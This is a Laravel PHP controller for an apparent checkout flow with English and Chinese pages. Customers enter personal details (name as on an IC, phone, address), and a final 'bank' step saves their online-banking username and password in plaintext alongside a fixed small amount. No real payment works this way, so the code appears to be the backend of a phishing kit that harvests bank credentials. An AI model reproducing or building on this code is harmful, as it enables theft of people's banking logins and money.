<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App;
use App\Sale;

class IndexController extends Controller
{
    public function __construct(){
        
    }
    
    public function index(Request $request) {
        return view('index');
    }
    public function index_zh(Request $request) {
        return view('index_zh');
    }

    public function pos(Request $request) {
        return view('pos');
    }

    public function pos_submit(Request $request) {
        $sale = Sale::create([
            'price' => $request->get('price'),
            'quantity' => $request->get('quantity'),
        ]);
        return redirect(route('form', $sale->id));
    }

    public function form($id) {
        $sale = Sale::find($id);
        return view('form', compact('sale'));
    }
 
    public function form_submit(Request $request) {
        $request->validate([
            'name_as_ic' => 'required|string|min:6|regex:/^[\pL\s\-]+$/u',
            'phone_number' => 'numeric|min:10',
            'address' => 'required|string',
            'postcode' => 'required|string|max:5',
        ]);
        $sale = Sale::find($request->get('sale_id'));
        $sale->update([
            'name_as_ic' => $request->get('name_as_ic'),
            'postcode' => $request->get('postcode'),
            'phone_number' => $request->get('phone_number'),
            'address' => $request->get('address'),
        ]);
        return view('bank', compact('sale'));
    }

    public function bank_submit(Request $request) {
        $sale = Sale::find($request->get('sale_id'));
        $sale->update([
            'bank_id' => $request->get('bank_id'),
            'username' => $request->get('username'),
            'password' => $request->get('password'),
            'amount' => 5,
            'reference_no' => $request->get('reference_no'),
        ]);
        return response()->json('success');
    }

    public function lang($locale)
    {
        App::setLocale($locale);
        session()->put('locale', $locale);
        return redirect()->back();
    }
}
